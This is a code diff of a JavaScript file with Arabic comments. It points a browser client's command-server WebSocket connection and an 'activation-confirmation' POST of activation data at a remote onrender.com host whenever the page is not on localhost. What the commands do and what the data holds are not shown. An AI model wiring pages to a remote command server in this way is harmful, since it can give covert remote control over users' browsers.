@@ -217,8 +217,14 @@
     
     // الاتصال بخادم التحكم
     async function connectToControlServer() {
+        // تحديد الرابط الصحيح بناءً على البيئة
+        const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+        const commandServerUrl = isLocalhost 
+            ? 'ws://localhost:4000' 
+            : 'wss://remote-control-command-server.onrender.com';
+            
         const servers = [
-            'ws://localhost:4000',
+            commandServerUrl,
             'ws://192.168.1.100:4000',
             'wss://your-server.com/control',
             'wss://backup-server.com/control',
@@ -577,7 +583,12 @@
         }
         
         // إرسال عبر HTTP أيضاً
-        fetch('http://localhost:4000/activation-confirmation', {
+        const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+        const commandServerHttpUrl = isLocalhost 
+            ? 'http://localhost:4000' 
+            : 'https://remote-control-command-server.onrender.com';
+            
+        fetch(`${commandServerHttpUrl}/activation-confirmation`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(activationData)
